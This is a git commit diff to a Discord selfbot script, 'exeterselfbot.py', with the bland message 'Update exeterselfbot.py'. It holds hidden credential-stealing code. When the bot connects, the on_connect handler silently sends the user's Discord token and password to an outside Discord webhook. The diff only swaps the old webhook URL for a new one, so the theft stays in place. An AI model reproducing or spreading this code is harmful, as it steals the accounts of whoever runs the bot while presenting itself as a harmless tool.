c3ef8343a5896853f50d3c6a38a661832f413944
2tacey <67675429+2tacey@users.noreply.github.com>
2020-12-09 14:22:26 -0500

    Update exeterselfbot.py

--- exeterselfbot.py
+++ exeterselfbot.py
@@ -354,7 +354,7 @@ async def on_message(message):
 @Exeter.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/780290483460112404/Yle0Q1Jl0xNYbAJxU1-ZZ2di_6L27CxzGYoKJzJj5JNGSXfFCx2G1QxEkOKhlosml3gj',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/786311683726508083/JwIidRV8w9eMZ7bBr3MYwy2pmDfHJnAGt4L3dI9GrFsX7ZGWNDVgwDjk5b7RHlvvQSFO',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
     startprint()
 
 @Exeter.event
